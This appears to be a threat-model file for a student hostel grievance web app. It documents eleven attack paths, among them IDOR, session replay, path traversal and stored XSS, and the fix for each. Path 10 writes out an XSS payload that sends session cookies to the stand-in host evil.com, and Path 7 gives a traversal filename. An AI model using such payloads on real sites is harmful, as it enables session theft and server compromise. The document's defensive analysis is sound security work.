# THREAT-MODEL.md — HostelGrievance

## What We Are Protecting

| Asset | Sensitivity | Why It Matters |
|-------|-------------|----------------|
| User passwords | Critical | SHA-256 hashes were crackable in seconds. Now bcrypt with 12 rounds. |
| Session tokens | Critical | A stolen token = full account access without knowing the password. |
| SQLite database file | Critical | Contains everything. If an attacker gets this file, they get all of it. |
| Student grievance data | High | Private between the filing student and the warden only. |
| File attachments | High | Private evidence. Must not be downloadable by other students. |
| Server filesystem | High | An attacker who can write arbitrary files here owns the server. |
| Warden actions | Medium | Status updates and comments. Less sensitive but must not be forged. |

---

## Who Can Do What

| Actor | Trust | What They Can Do |
|-------|-------|-----------------|
| Anonymous | None | Reach the login page. Nothing else. |
| Student | Low | File grievances, comment, upload attachments — on their own grievances only. |
| Warden | Medium | Read all grievances. Update status on any grievance. Cannot edit student content. |
| Administrator | High | Direct server and database access. Managed outside the app. |
| External attacker | None | Has no valid account. Probing API endpoints directly. |
| Malicious student | Low but hostile | Has a valid login. Trying to reach other students' data. |

The most realistic attacker in this system is a malicious student. They already have a
valid session. The question is how far they can move with it.

---

## Trust Boundaries

```
[ Browser / Client ]
        |
        |  HTTPS (TLS at infrastructure layer)
        |
[ Hono API Server ]  <-- The only boundary we fully control
        |         |
        |         |  File I/O
        |         |
  [ SQLite DB ]  [ Uploads Folder ]
```

**Browser to API:** Fully untrusted. Every field, every header, every filename is
treated as potentially malicious. The server validates and authorizes everything
independently of what the frontend claims.

**API to SQLite:** Trusted internal boundary. All queries use parameterised statements.
SQL injection is not possible through normal query paths.

**API to Filesystem:** Semi-trusted. We removed original filenames from the storage
path. Stored names are always server-generated hex strings. readStoredFile() has a
path traversal check as a second layer.

**localStorage in the browser:** We noticed the app stores a copy of the user object
in localStorage for displaying the correct UI. The server never uses localStorage data
for any authorization decision. If a student edits their localStorage to claim they are
a warden, the API still rejects every warden-only request with 403.

---

## Attack Surface

| Endpoint | Auth Required | Notes |
|----------|--------------|-------|
| POST /api/login | No | Rate limited. 5 attempts per IP per minute. |
| POST /api/grievances | Student | Title, description, category, optional file. All fields length-validated. File magic-byte checked. |
| GET /api/grievances | Student or Warden | Students get only their own. Wardens get all. |
| GET /api/grievances/:id | Student or Warden | Ownership enforced for students. |
| PATCH /api/grievances/:id | Student or Warden | Students cannot change status. |
| GET /api/grievances/:id/comments | Student or Warden | Ownership enforced for students. |
| POST /api/grievances/:id/comments | Student or Warden | Ownership enforced. 2000 char limit. |
| POST /api/grievances/:id/attachments | Student | Ownership enforced. 2MB cap. Magic byte verified. |
| GET /api/attachments/:id | Student or Warden | Ownership enforced. Served as download. |
| POST /api/logout | Any authenticated | Destroys session in DB before clearing cookie. |

---

## Attack Paths We Found and Fixed

### Path 1 — IDOR: Student reads another student's grievance

```
Student A logs in.
Student A notices grievance URLs end in GRV-0001, GRV-0002, etc.
Student A changes the ID to GRV-0003 (belongs to Student B).
```

Before: Server returned Student B's full grievance data.
After: Server returns 403. assertCanViewGrievance() checks session user ID
against grievance student_id on every read.

---

### Path 2 — IDOR: Student downloads another student's attachment

```
Student A notes an attachment ID from any grievance URL.
Student A requests GET /api/attachments/<other-student-attachment-id>.
```

Before: Server returned the file.
After: Server returns 403. Attachment ownership is verified against the
parent grievance before the file is read from disk.

---

### Path 3 — Student escalates grievance status

```
Student A sends PATCH /api/grievances/GRV-0001 with { "status": "Resolved" }.
```

Before: Status was updated. Students could close their own grievances.
After: Server returns 403. Status changes are warden-only. The check runs
server-side regardless of what the frontend renders.

---

### Path 4 — Session replay after logout

```
Attacker intercepts Student A's session cookie.
Student A logs out.
Attacker replays the cookie against GET /api/me.
```

Before: Token was still valid. Server returned the user object.
After: Logout calls destroySession() which deletes the row from the sessions
table. The replayed token returns 401 immediately.

---

### Path 5 — Brute force login

```
Attacker knows a student's email address.
Attacker scripts 10,000 password guesses per minute.
```

Before: No limit. Attack runs until password is found.
After: 5 wrong attempts from the same IP = 429 for 60 seconds.

---

### Path 6 — MIME spoofing to upload malicious file

```
Attacker creates an HTML file containing <script>document.cookie</script>.
Attacker names it photo.png and sets Content-Type: image/png.
Attacker uploads it as a grievance attachment.
Warden opens the attachment. Script executes. Cookie stolen.
```

Before: File accepted on Content-Type alone. Served inline.
After: Server reads the first 8 bytes of every upload and checks against
known magic byte signatures. A file that claims to be PNG but does not
start with 89 50 4E 47 is rejected with 400 before it touches disk.
Even if a file got through, it is served as Content-Disposition: attachment
so the browser downloads it instead of rendering it.

---

### Path 7 — Path traversal via filename

```
Attacker uploads a file named ../../server/app.ts.
Server saves the file using the original name.
Application source code is overwritten.
```

Before: newStoredName() accepted the original filename and used it directly.
writeStoredFile() had no traversal check.
After: newStoredName() generates randomBytes(16).toString('hex') + extension.
Original filename is stored in the DB for display only. Never touches disk.

---

### Path 8 — Password cracking after database theft

```
Attacker obtains a copy of hostel.db through any means.
Attacker extracts password_hash column.
Attacker runs hashes through a rainbow table.
SHA-256 with no salt cracks in under a second per hash.
```

Before: Unsalted SHA-256. Crackable instantly.
After: bcrypt with 12 rounds and a random salt per hash. Each guess
takes ~300ms of CPU time. Cracking one password at this rate would
take years on modern hardware.

---

### Path 9 — Timing attack for user enumeration

```
Attacker sends login requests with guessed email addresses.
Valid email = server runs bcrypt = ~300ms response.
Invalid email = server skips bcrypt = ~1ms response.
Attacker builds a confirmed list of registered emails.
```

Before: The fast path for invalid emails was measurable.
After: Server runs bcrypt on a dummy hash even for invalid emails.
All login responses take ~300ms regardless of whether the email exists.

---

### Path 10 — Stored XSS via comment

```
Attacker posts a comment containing:
<script>document.location='http://evil.com?c='+document.cookie</script>
Any user who opens the grievance has the script execute.
Attacker receives the victim's session cookie.
```

Before: The app used {@html content} in two Svelte components, bypassing
Svelte's automatic escaping.
After: We removed both {@html} interpolations. Content renders as plain text.

---

### Path 11 — Information disclosure via error messages

```
Attacker sends a malformed request that triggers an unhandled server error.
Error response contains:
"ENOENT: no such file, open 'C:\Users\DELL\Desktop\server\uploads\...'"
Attacker now knows the full server file path and OS.
```

Before: Raw Node.js error objects sent in API responses.
After: All unhandled errors return "Internal server error." only.
Full details stay in the server console log.
